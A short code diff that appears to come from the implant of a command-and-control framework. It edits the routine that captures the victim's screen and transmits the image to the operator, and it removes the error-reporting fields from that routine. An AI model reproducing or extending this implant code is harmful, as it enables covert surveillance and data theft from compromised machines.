@@ -2087,13 +2087,13 @@ VOID CommandConfig( PPARSER Parser )
 VOID CommandScreenshot( PPARSER Parser )
 {
     PUTS( "Screenshot" )
-    PPACKAGE Package     = PackageCreate( DEMON_COMMAND_SCREENSHOT );
-    PVOID    Image       = NULL;
-    SIZE_T   Size        = 0;
-    PCHAR    ErrReason   = NULL;
-    DWORD    ErrCode     = 0;
+    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
+    PVOID    Image   = NULL;
+    SIZE_T   Size    = 0;
 
-    if ( WinScreenshot( &Image, &Size, &ErrReason, &ErrCode ) )
+    // TODO: add error checking in WinScreenshot and send screenshot in pieces
+
+    if ( WinScreenshot( &Image, &Size ) )
     {
         PUTS( "Successful took screenshot" )
         PackageAddInt32( Package, TRUE );
@@ -2103,8 +2103,6 @@ VOID CommandScreenshot( PPARSER Parser )
     {
         PUTS( "Failed to take screenshot" )
         PackageAddInt32( Package, FALSE );
-        PackageAddString( Package, ErrReason ? ErrReason : "unknown error" );
-        PackageAddInt32( Package, ErrCode );
     }
 
     PackageTransmit( Package );
